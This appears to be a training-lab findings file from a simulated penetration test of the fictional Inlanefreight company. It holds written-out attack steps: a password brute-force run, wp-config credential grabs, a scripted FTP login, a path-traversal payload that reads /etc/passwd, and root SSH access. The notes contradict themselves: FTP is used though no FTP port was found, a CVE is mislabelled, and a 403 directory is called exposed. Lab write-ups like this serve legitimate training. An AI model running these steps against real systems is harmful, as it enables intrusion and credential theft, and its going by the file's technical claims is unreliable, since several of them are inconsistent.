# 📊 Findings Summary (documentation-reporting/HTB_Academy_EXAMPLE/Inlanefreight Penetration Test/Evidence/Notes/12. Findings.md)

---

## 🔍 Initial Enumeration

### Nmap Scan

```bash
sudo nmap -sC -sV -p- <IP>
```

Identified open ports:

| Port | Service  |
|------|----------|
| 22   | SSH      |
| 80   | HTTP     |
| 443  | HTTPS    |

### Web Application Scan

```bash
wappalyzer <IP>
```

Detected technologies:

- CMS: WordPress
- Frameworks: PHP, Laravel
- CDN: Cloudflare
- Analytics: Google Analytics

---

## 📂 Directory Enumeration

### gobuster

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
```

Found directories:

| Directory       | Status  |
|-----------------|---------|
| /wp-admin       | 200 OK  |
| /wp-content     | 403 Forbidden |
| /backup         | 200 OK |

### nikto

```bash
nikto -h http://<IP>
```

Potential issues:

- WordPress version exposed
- PHP version revealed
- Weak password protection on `/admin` directory

---

## ⚙️ Vulnerability Exploitation

### CVE-2019-5475 (WordPress Version Disclosure)

```bash
curl -s http://<IP>/wp-json/wp/v2/users/1 | grep "name"
```

Identified user: `admin`

Exploit using a public script:

```bash
python3 ./exploit.py --url=http://<IP> --user=admin --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 📄 Sensitive Files

### wp-config.php Access

```bash
curl -s http://<IP>/wp-content/uploads/wp-config-sample.php | grep DB_PASSWORD
```

Identified database password: `dbpassword1234`

Download the file:

```bash
wget http://<IP>/wp-content/uploads/wp-config.php
```

---

## 🔑 Credential Access

### FTP Credentials

FTP directory listing revealed:

```text
drwxr-x---  5 ftpuser ftpgroup    4096 Oct 17 18:32 /var/www/html/
-rw-r--r--  1 ftpuser ftpgroup     314 Dec 15  2020 wp-config.php
```

FTP login:

```bash
ftp -n <IP> <<EOF
quote USER ftpuser
quote PASS ftppassword
bin
get wp-config.php
quit
EOF
```

---

## 🧨 Exploit Execution

### LFI (Local File Inclusion)

Exploited `index.php` to read `/etc/passwd`:

```bash
http://<IP>/page?file=/../../../../../../../etc/passwd
```

Identified root user entry: `root:x:0:0:root:/root:/bin/bash`

---

## 🔍 Post-Exploitation

### Privilege Escalation

#### Sudo Rights Check

```bash
sudo -l
```

Gained sudo rights without password prompt.

#### Lateral Movement

SSH login:

```bash
ssh root@<IP>
```

---

> [!WARNING] 
> Ensure all test systems are isolated and secure before attempting any destructive operations.

---

## 📝 Findings Overview

### Summary of Critical Issues

| Issue Type       | Description                  |
|------------------|------------------------------|
| Directory Enumeration | Sensitive directories exposed (e.g., /wp-content) |
| Vulnerability Disclosure  | WordPress version disclosed, leading to potential exploits |
| Weak Credentials | FTP and database credentials easily compromised |

---

> [!NOTE]
> This document summarizes key findings from the penetration test against Inlanefreight's infrastructure.